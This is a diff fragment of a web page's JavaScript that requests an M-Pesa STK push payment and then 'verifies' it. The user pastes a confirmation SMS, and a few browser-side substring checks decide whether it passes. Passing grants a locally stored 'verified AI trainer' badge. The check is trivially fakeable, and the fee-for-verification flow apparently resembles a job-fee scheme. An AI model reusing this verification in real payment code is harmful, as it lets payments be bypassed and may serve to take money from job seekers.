+        account_id: '4596'
+    };
+
+    try {
+        const res = await fetch('https://api.payhero.stkpush.co.ke/payments/stk-push/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        console.log('STK push response:', data);
+    } catch(e) {
+        console.error('STK push error:', e);
+    }
+
+    updateLoading('Check your phone\nEnter M-Pesa PIN');
+
+    setTimeout(() => {
+        hideLoading();
+        openManualVerify();
+    }, 15000);
+}
+
+// ================== MANUAL VERIFICATION ==================
+function openManualFromForm() {
+    try {
+        const phoneEl = document.getElementById('mpesaPhone');
+        if (phoneEl && phoneEl.value.trim()) state.currentPhone = phoneEl.value.trim();
+    } catch(e) {}
+    document.getElementById('paymentDetailsOverlay').classList.remove('active');
+    openManualVerify();
+}
+
+function openManualFromError() {
+    closePaymentError();
+    openManualVerify();
+}
+
+function openManualVerify() {
+    document.getElementById('expectedAmountDisplay').textContent =
+        `Expected Amount: KES ${state.kshAmount}`;
+    document.getElementById('mpesaMessageInput').value = '';
+    document.getElementById('manualVerifyOverlay').classList.add('active');
+}
+
+function closeManualVerify() {
+    document.getElementById('manualVerifyOverlay').classList.remove('active');
+}
+
+function verifyMpesaMessage() {
+    const msg = document.getElementById('mpesaMessageInput').value.trim();
+    if (!msg) { showToast('Please paste your M-Pesa message'); return; }
+
+    if (verifyMpesaText(msg)) {
+        closeManualVerify();
+        showToast('Payment verified successfully!', true);
+        setTimeout(showSuccessPopup, 800);
+    } else {
+        showToast('Verification failed. Please check the message and try again.');
+    }
+}
+
+function verifyMpesaText(msg) {
+    const lower = msg.toLowerCase();
+    const tillLower = state.tillName.toLowerCase();
+
+    if (!lower.includes(tillLower)) {
+        showToast('This payment was not made to us');
+        return false;
+    }
+
+    const amt = String(state.kshAmount);
+    const found =
+        lower.includes(`ksh${amt}.00`) ||
+        lower.includes(`ksh ${amt}.00`) ||
+        lower.includes(`${amt}.00`) ||
+        lower.includes(`ksh${amt}`) ||
+        lower.includes(`ksh ${amt}`);
+
+    if (!found) {
+        showToast(`Payment amount does not match. Expected: KES ${amt}`);
+        return false;
+    }
+
+    if (!lower.includes('confirmed') && !lower.includes('sent')) {
+        showToast("This doesn't appear to be a valid M-Pesa confirmation message");
+        return false;
+    }
+
+    return true;
+}
+
+// ================== SUCCESS POPUP ==================
+function showSuccessPopup() {
+    document.getElementById('successOverlay').classList.add('active');
+}
+
+function handleSuccessProceed() {
+    document.getElementById('successOverlay').classList.remove('active');
+
+    // Save verified badge
+    localStorage.setItem('verifiedbadge', JSON.stringify(['verifiedbadge']));
+
+    showToast('You are now a verified AI trainer!', true);
+    setTimeout(() => {
+        window.location.href = 'important-info.html';
+    }, 1500);
+}
+
+// ================== ERROR POPUP ==================
+function showPaymentError(msg) {
+    document.getElementById('errorMsgText').textContent = msg;
+    document.getElementById('paymentErrorOverlay').classList.add('active');
+}
+
+function closePaymentError() {
+    document.getElementById('paymentErrorOverlay').classList.remove('active');
+}
+
+function retryPayment() {
+    closePaymentError();
+    openPaymentDetails(state.selectedMethod);
+}
+
+// ================== LOADING OVERLAY ==================
+function showLoading(msg) {
+    document.getElementById('loadingText').innerHTML = msg.replace(/\n/g, '<br>');
+    document.getElementById('loadingOverlay').classList.add('active');
+}
+
+function updateLoading(msg) {
+    document.getElementById('loadingText').innerHTML = msg.replace(/\n/g, '<br>');
+}
+
+function hideLoading() {
+    document.getElementById('loadingOverlay').classList.remove('active');
+}
+
+// ================== TOAST ==================
+function showToast(msg, success = false) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast' + (success ? ' success' : '');
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2800);
+}
+</script>
+</body>
+</html>
